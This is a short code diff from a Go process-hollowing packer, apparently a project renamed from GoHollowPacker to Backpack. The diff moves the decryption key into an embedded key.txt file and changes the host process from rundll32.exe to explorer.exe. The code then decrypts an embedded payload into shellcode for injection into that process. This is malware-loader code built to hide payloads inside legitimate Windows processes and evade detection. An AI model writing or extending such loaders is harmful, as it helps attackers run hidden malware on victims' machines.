@@ -5,16 +5,20 @@ import (
 	"crypto/cipher"
 	_ "embed"
 	"encoding/hex"
-	"github.com/Enelg52/GoHollowPacker/runpe"
+	"github.com/Enelg52/Backpack/runpe"
 )
 
 //https://pkg.go.dev/embed
+//go:embed key.txt
+var k string
+
 //go:embed pe.txt
 var s string
 
 func main() {
-	key := []byte("12345678901234567890123456789044")
-	src := "C:\\Windows\\system32\\rundll32.exe"
+	key := []byte(k)
+	src := "C:\\Windows\\explorer.exe"
+	//change the console value to false if you don't want a new window
 	console := true
 	payload, _ := decrypt([]byte(s), key)
 	shellcode, err := hex.DecodeString(string(payload))
